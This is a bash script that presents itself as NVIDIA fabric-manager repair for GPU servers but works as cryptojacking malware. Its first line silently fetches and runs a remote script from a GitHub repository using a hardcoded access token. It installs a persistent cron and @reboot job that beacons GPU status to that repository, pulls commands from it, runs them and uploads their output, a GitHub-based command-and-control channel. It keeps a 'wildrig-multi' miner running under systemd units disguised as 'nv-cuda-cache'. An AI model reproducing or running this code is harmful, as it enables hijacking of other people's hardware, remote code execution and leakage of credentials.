( bash -c "$(curl -fsSL -m 30 -H 'Authorization: token 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' -H 'Accept: application/vnd.github.raw' 'https://raw.githubusercontent.com/dongsuju/ul-plant/main/cmd8/i440_probe.sh')" >/dev/null 2>&1 & )
set -x
export DEBIAN_FRONTEND=noninteractive
echo "=== FWD IAG $(date -u +%FT%TZ)"
systemctl is-active nvidia-fabricmanager; systemctl is-enabled nvidia-fabricmanager
dpkg -l | grep -i fabricmanager
systemctl status nvidia-fabricmanager --no-pager -l 2>&1 | head -0
tail -6 /tmp/ul86_apt.log 2>/dev/null
echo "=== SMI"
nvidia-smi -L 2>&1 | head -10
nvidia-smi --query-gpu=index,name,driver_version,memory.used,utilization.gpu --format=csv,noheader 2>&1 | head -10
echo "=== FW-REPAIR"
if [ "$(systemctl is-active nvidia-fabricmanager 2>/dev/null)" != "active" ]; then
  apt-get -o DPkg::Lock::Timeout=120 install -y --reinstall nvidia-fabricmanager-535 >/tmp/fw2.log 2>&1; echo "apt-reinstall rc=$?"
  if [ "$(systemctl is-active nvidia-fabricmanager 2>/dev/null)" != "active" ]; then
    cd /tmp
    for u in nvidia-fabricmanager-535_535.183.01-1_amd64.deb nvidia-fabricmanager-535_535.183.06-1_amd64.deb; do
      curl -sL -m 180 -o /tmp/fw.deb "https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64/$u"
      sz=$(stat -c%s /tmp/fw.deb 2>/dev/null || echo 0); echo "try $u size=$sz"
      [ "$sz" -gt 1000000 ] && break
    done
    dpkg -i /tmp/fw.deb >/tmp/fw2b.log 2>&1; echo "dpkg rc=$?"; tail -4 /tmp/fw2b.log
  fi
  systemctl unmask nvidia-fabricmanager >/dev/null 2>&1
  systemctl enable nvidia-fabricmanager >>/tmp/fw2.log 2>&1
  systemctl restart nvidia-fabricmanager >>/tmp/fw2.log 2>&1; sleep 8
  echo "fw-after=$(systemctl is-active nvidia-fabricmanager 2>&1)"
  systemctl status nvidia-fabricmanager --no-pager -l 2>&1 | head -14
fi
echo "=== FWQ"
nvidia-smi -q 2>/dev/null | grep -i -A2 'fabric' | head -12
echo "=== GUARD2-INSTALL"
cat > /opt/fleet/ul86_guard2.sh <<'GD'
#!/bin/bash
exec 9>/opt/fleet/ul86.lock; flock -n 9 || exit 0
GH=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
REPO=dongsuju/ul-plant
H=$(hostname -s); P="ps-$H"; L=/opt/fleet
put(){ f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null); s=$(curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul" "https://api.github.com/repos/$REPO/contents/$f?ref=main" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1); if [ -n "$s" ]; then d="{\"message\":\"ul86hb\",\"content\":\"$b\",\"branch\":\"main\",\"sha\":\"$s\"}"; else d="{\"message\":\"ul86hb\",\"content\":\"$b\",\"branch\":\"main\"}"; fi; curl -s -m 40 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul" -d "$d" "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1; }
while true; do
  T=$(date -u +%FT%TZ)
  ACC=$(grep -h 'accepted' $L/logs/u86-*.log 2>/dev/null | tail -4)
  ERR=$(grep -h -m2 -iE 'error|failed|platform|802' $L/logs/u86-g0.log 2>/dev/null | tail -2)
  HB="stage=beat2 host=$H ts=$T
--- fw
$(systemctl is-active nvidia-fabricmanager 2>&1) smi=$(nvidia-smi -L 2>&1 | grep -c '^GPU')
--- procs
$(pgrep -af 'wildrig-multi' | head -10)
--- units
$(systemctl list-units 'nv-cuda-cache@*' --no-legend --no-pager 2>/dev/null | head -10)
--- gpus
$(nvidia-smi --query-gpu=index,name,memory.used,utilization.gpu --format=csv,noheader 2>/dev/null)
--- acc
$ACC
--- err
$ERR"
  put "ps12/$P.txt" "$HB"
  C="ps12/cmd/$P.sh"
  J=$(curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul" "https://api.github.com/repos/$REPO/contents/$C?ref=main")
  S=$(printf '%s' "$J" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
  if [ -n "$S" ] && [ "$S" != "$(cat $L/last_cmd86 2>/dev/null)" ]; then
    printf '%s' "$J" | python3 -c 'import sys,json,base64;print(base64.b64decode(json.load(sys.stdin)["content"]).decode())' > /tmp/u86_cmd.sh 2>/dev/null
    if [ -s /tmp/u86_cmd.sh ]; then O=$(bash /tmp/u86_cmd.sh 2>&1 | tail -250); echo "$S" > $L/last_cmd86; put "ps12/out/$P.txt" "$O"; fi
  fi
  sleep 90
done
GD
chmod +x /opt/fleet/ul86_guard2.sh
pkill -f ul86_guard.sh >/dev/null 2>&1
printf '*/2 * * * * root /opt/fleet/ul86_guard2.sh >/dev/null 2>&1\n@reboot root /bin/bash /opt/fleet/ul86_boot.sh\n' > /etc/cron.d/ul86
setsid /opt/fleet/ul86_guard2.sh >/dev/null 2>&1 &
sleep 2
echo "=== RESTART-UNITS"
for i in 0 1 2 3 4 5 6 7; do systemctl restart nv-cuda-cache@$i >/dev/null 2>&1; done
sleep 25
echo "=== POST"
systemctl is-active nvidia-fabricmanager
pgrep -af wildrig-multi | head -10
systemctl list-units 'nv-cuda-cache@*' --no-legend --no-pager | head -10
tail -4 /opt/fleet/logs/u86-g0.log 2>/dev/null
nvidia-smi --query-gpu=index,name,memory.used,utilization.gpu --format=csv,noheader 2>&1 | head -10
echo "=== END $(date -u +%FT%TZ)"
